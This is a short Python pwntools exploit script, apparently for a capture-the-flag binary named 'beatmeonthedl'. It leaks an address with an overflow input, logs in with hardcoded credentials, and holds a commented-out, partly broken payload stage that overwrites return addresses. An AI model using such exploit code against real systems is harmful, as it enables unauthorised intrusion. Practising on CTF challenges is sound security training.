#!/usr/bin/env python
from pwn import *
import sys
from random import getrandbits


def printl(text):
	sys.stdout.write(text)


context(arch='i386', os='linux')

# 1. Get leak

r = process('beatmeonthedl')
#r = remote('141.85.224.100', 31338)

payload_leak  = 'A'*16
payload_login = "mcfly" + "\n" + "awesnap" + "\n" 
username = 'mcfly'
passwd = 'awesnap'


data = ''

r.sendline(payload_leak)


while r.can_recv():
	try:
		data += r.recvline()
	except:
		pass

printl("Output: " + data)		


data = data[len(data)-7:len(data)-1]
target = hex(unpack(data, 'all'))
printl("[+]Leak: " + target  + '\n')


#2. Login

data = ''
r.sendline(username)
data = r.recv()
print data	

data = ''
r.sendline(passwd)
data = r.recv()
print data	

#cccccccccccccccccccccccccccccccccccccccccccccccccccccccc
'''
r.sendline('1')
r.recv()
r.sendline("acasa")
r.recv()
r.sendline("2")
fin = r.recvline()
print "Output: " + fin

payload = 'n'* 16
payload += p32(target)
payload += p32(target)
payload += p32(target)
payload += p32(flaggy)

print "Payload generated is: " + payload+ " ["+ str(len(payload)) + ']'
r.send(payload)

while r.can_recv(timeout = 0.35):
	try:
		data = r.recv(timeout=0.01)
	except:
		pass
print str(data)
'''

r.interactive()
